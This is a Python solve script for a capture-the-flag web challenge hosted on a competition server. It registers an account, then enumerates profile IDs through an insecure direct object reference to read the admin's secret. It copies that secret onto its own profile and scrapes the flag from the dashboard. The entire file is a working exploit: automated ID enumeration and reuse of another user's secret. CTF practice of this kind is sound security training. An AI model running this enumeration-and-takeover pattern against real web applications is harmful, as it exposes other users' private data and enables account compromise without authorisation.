#!/usr/bin/env python3
"""
CTF Challenge: WebBasics - OTP
Target: http://exp.cybergame.sk:7020
Flag format: SK-CERT{}

Vulnerability: IDOR (Insecure Direct Object Reference) on /profile/{id} endpoint
allows unauthenticated access to any user's profile, including the admin's
secret initializator. Once obtained, setting the admin's secret initializator
on your own account generates the flag token.
"""

import requests
import random
import string
import re
import sys

BASE_URL = "http://exp.cybergame.sk:7020"


def random_username():
    return "ctf_" + "".join(random.choices(string.ascii_lowercase, k=8))


def main():
    session = requests.Session()

    # Step 1: Register a new account
    username = random_username()
    password = "h4ck_th1s!"

    print(f"[*] Registering account: {username}")
    resp = session.post(
        f"{BASE_URL}/register",
        data={"username": username, "password": password},
        allow_redirects=True,
    )

    if resp.status_code != 200:
        print(f"[!] Registration failed (HTTP {resp.status_code})")
        sys.exit(1)
    print("[+] Registration successful")

    # Step 2: Login
    print(f"[*] Logging in as {username}")
    resp = session.post(
        f"{BASE_URL}/login",
        data={"username": username, "password": password},
        allow_redirects=True,
    )

    if "Token Dashboard" not in resp.text:
        print("[!] Login failed - dashboard not visible")
        sys.exit(1)
    print("[+] Login successful")

    # Step 3: Extract our user ID from the profile link in the nav
    match = re.search(r"/profile/(\d+)", resp.text)
    if not match:
        print("[!] Could not determine our user ID")
        sys.exit(1)
    our_id = int(match.group(1))
    print(f"[*] Our user ID: {our_id}")

    # Step 4: Enumerate profiles via IDOR to find admin's secret initializator
    print("[*] Enumerating user profiles via IDOR...")

    admin_secret = None
    for uid in range(1, 50):
        resp = session.get(f"{BASE_URL}/profile/{uid}")
        if resp.status_code != 200:
            continue

        secret_match = re.search(
            r"<strong>Secret Initializator:</strong>.*?([a-f0-9]{64})", resp.text
        )
        if secret_match:
            secret = secret_match.group(1)
            print(f"  [+] Profile {uid}: secret = {secret}")

            # We're looking for the non-default secret (the admin one)
            if secret != "default_secret":
                admin_secret = secret
                break

    if not admin_secret:
        print("[!] Could not find admin's secret initializator")
        sys.exit(1)

    print(f"[+] Found admin's secret initializator: {admin_secret}")

    # Step 5: Update our own profile with the admin's secret initializator
    print(f"[*] Updating our profile with admin's secret...")
    resp = session.post(
        f"{BASE_URL}/profile/{our_id}",
        data={"secret_init": admin_secret},
        allow_redirects=True,
    )

    if resp.status_code != 200:
        print(f"[!] Profile update failed (HTTP {resp.status_code})")
        sys.exit(1)
    print("[+] Profile updated successfully")

    # Step 6: Visit the dashboard to get the flag token
    print("[*] Fetching dashboard to retrieve flag...")
    resp = session.get(f"{BASE_URL}/")

    # Extract flag from the green panel
    flag_match = re.search(r"(SK-CERT\{[^}]+\})", resp.text)
    if flag_match:
        flag = flag_match.group(1)
        print()
        print("=" * 60)
        print(f"  FLAG: {flag}")
        print("=" * 60)
    else:
        print("[!] Could not find the flag on the dashboard")
        sys.exit(1)


if __name__ == "__main__":
    main()
